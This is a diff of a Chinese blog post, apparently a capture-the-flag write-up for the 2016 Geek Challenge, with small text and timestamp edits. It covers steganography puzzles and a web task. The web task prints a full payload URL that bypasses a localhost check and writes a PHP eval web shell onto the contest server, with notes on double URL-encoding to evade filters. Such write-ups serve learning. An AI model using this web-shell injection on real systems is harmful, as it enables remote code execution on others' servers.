@@ -22,7 +22,7 @@
 <meta property="og:site_name" content="春风十里">
 <meta property="og:description" content="第七季极客大挑战第一次参加这样的比赛，写个write up平复一下心情">
 <meta property="og:image" content="http://i1.piimg.com/567571/b53c0ebf5552a22a.png">
-<meta property="og:updated_time" content="2016-10-21T04:47:29.200Z">
+<meta property="og:updated_time" content="2016-10-21T04:52:25.360Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="极客大挑战">
 <meta name="twitter:description" content="第七季极客大挑战第一次参加这样的比赛，写个write up平复一下心情">
@@ -315,7 +315,7 @@
       
           
         <h1 id="第七季极客大挑战"><a href="#第七季极客大挑战" class="headerlink" title="第七季极客大挑战"></a>第七季极客大挑战</h1><p>第一次参加这样的比赛，写个write up平复一下心情<br><a id="more"></a></p>
-<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="闪得好快"><a href="#闪得好快" class="headerlink" title="闪得好快"></a>闪得好快</h3><p>第一次用火狐打开发现是一堆乱码，然后换用360变成了一个下载链接，是一个gif图，像素应该是280*280，改下像素分帧，一个一个的扫码就行。</p>
+<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="闪得好快"><a href="#闪得好快" class="headerlink" title="闪得好快"></a>闪得好快</h3><p>第一次用火狐打开发现是一堆乱码，然后换用360变成了一个下载链接，是一个gif图，像素应该是280*280，改下像素，然后分帧，得到单个的图片，一个一个的扫码。</p>
 <h3 id="Come-game"><a href="#Come-game" class="headerlink" title="Come_game"></a>Come_game</h3><p>第一次做直接玩通关了，竟然真的有flag，但是我死了400多次= =，仔细去审下题，有一个save存档，把0034直接改为0035即可通关。</p>
 <h3 id="snow"><a href="#snow" class="headerlink" title="snow"></a>snow</h3><p>提示为html隐写，好吧百度一下，有个链接<a href="http://fog.misty.com/perry/ccs/snow/snow/snow.html" title="snow html隐写" target="_blank" rel="external">http://fog.misty.com/perry/ccs/snow/snow/snow.html</a><br>进去把网页跟key输进去即可得到flag</p>
 <h3 id="旋转跳跃"><a href="#旋转跳跃" class="headerlink" title="旋转跳跃"></a>旋转跳跃</h3><p>提示有key，然后是音频文件，想到用MP3Stego<br><img src="http://i1.piimg.com/567571/b53c0ebf5552a22a.png" alt=""><br>解密可得到一个txt文件里面就是flag</p>
@@ -374,9 +374,9 @@ if(strpos($url,&apos;http://127.0.0.1/&apos;) === 0){ //file开头应为http://1
 }else{
     echo &quot;Hello.Geeker&quot;;
 }
-</code></pre><p>最开始的想法是直接在后面<a href="http://127.0.0.1后面加一句话，发现都被过滤掉了，然后想绕过构造到如下的payload" target="_blank" rel="external">http://127.0.0.1后面加一句话，发现都被过滤掉了，然后想绕过构造到如下的payload</a></p>
+</code></pre><p>最开始的想法是直接在file=<a href="http://127.0.0.1" target="_blank" rel="external">http://127.0.0.1</a> 后面加一句话，发现都被过滤掉了，然后想到绕过去构造如下的payload</p>
 <pre><code>http://game.sycsec.com:50084/?file=http://127.0.0.1/?file=http://127.0.0.1/%26path%3D%3C?php%2520eval($_POST[%27shell%27]);?%3E&amp;path=shell.php
-</code></pre><p>先尝试访问下</p>
+</code></pre><p>可以先尝试访问下</p>
 <pre><code>http://game.sycsec.com:50084/?file=http://127.0.0.1/%26path%3D%3C?php%2520eval($_POST[%27shell%27]);?%3E、
 </code></pre><p>然后查看源代码发现它把一句话当做上传目录了然后在进行一次file path上传就把这个url作为了file上传，从而将一句话写入到了upload里<br>用木马连下就得到flag<br>还有要注意的地方是一句话需要进行url编码绕过，由于服务器在接收GET参数的时候本身就会对参数进行一次URL解码 , 因此需要对file参数进行两次URL编码然后再进行传递,其实这里有问题就只是空格,空格URL编码后为%20,但是因为这里进行了两次URL解码因此需要将空格的URL编码再进行编码最后再传递,其实也只需要对%20中的%进行URL编码是%25<br>补充一个get知识</p>
 <pre><code>在http协议中GET请求中如果包含多个参数 , 参数之间使用&amp;分隔 , 因此这里要对file参数中的&amp;进行处理 , 或者因为file就是一个完整的参数 , 可以将其整体进行URL编码 , 然后再进行参数的传递
@@ -466,7 +466,7 @@ print q.content.decode(&apos;utf-8&apos;) #输出返回值
         <p><span>本文标题:</span><a href="/2016/10/21/极客大挑战/">极客大挑战</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">zp</a></p>
         <p><span>发布时间:</span>2016-10-21, 10:32:23</p>
-        <p><span>最后更新:</span>2016-10-21, 12:47:29</p>
+        <p><span>最后更新:</span>2016-10-21, 12:52:25</p>
         <p>
             <span>原始链接:</span><a class="post-url" href="/2016/10/21/极客大挑战/" title="极客大挑战">https://clearloveqaq.github.io/2016/10/21/极客大挑战/</a>
             <span class="copy-path" data-clipboard-text="原文: https://clearloveqaq.github.io/2016/10/21/极客大挑战/　　作者: zp" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
